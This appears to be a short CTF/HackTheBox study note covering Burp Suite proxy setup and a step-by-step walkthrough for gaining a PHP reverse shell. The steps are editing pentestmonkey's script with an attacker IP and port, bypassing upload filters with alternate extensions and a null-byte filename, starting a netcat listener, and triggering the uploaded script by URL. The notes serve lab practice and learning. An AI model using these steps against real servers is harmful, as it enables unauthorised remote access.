
## Burp Suite web crawler : 
first set-up by visiting the proxy network settings and set the ip address of 127.0.0.1 on port 8080 
then visit Target on Burpsuite and we can see a the whole website structure , mainly the login page 

## PHP reverse-shell :

## 🔁 Common Scenario in HTB or CTFs:

- You find **file upload**, **command injection**, or **LFI to RCE**.
    
- You manage to **upload or inject a PHP payload** that gets executed.
    
- You use that to **gain a reverse shell** and interact with the system.
    

---

## ⚙️ How to Use a PHP Reverse Shell on HTB

### ✅ 1. **Get a PHP reverse shell script**

Use `Pentestmonkey`'s reverse shell (very popular):

- Path on Kali
    
    `/usr/share/webshells/php/php-reverse-shell.php`
    

Or get it online:  
[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

---

### ✅ 2. **Edit the shell**

Open it and change these two lines:

`$ip = 'YOUR_IP';  // Your VPN IP from HTB $port = 4444;     // Any port you want to listen on`

---

### ✅ 3. **Upload the reverse shell**

You need to:

- Find a **file upload** page and **upload it**.
    
- Or find **RCE or LFI** to **execute** the PHP script.
    

Common techniques:

- Upload as `.php`, `.php5`, `.phtml`
    
- Use null byte injection if needed: `shell.php%00.jpg`
    
- Bypass image filters by modifying content.
    

---

### ✅ 4. **Start your listener**

`nc -lvnp 4444`

This will wait for incoming connections.

---

### ✅ 5. **Trigger the shell**

Access the script from your browser or through command injection:


`http://target-ip/uploads/php-reverse-shell.php`

If successful, you’ll get a shell on your Netcat listener.


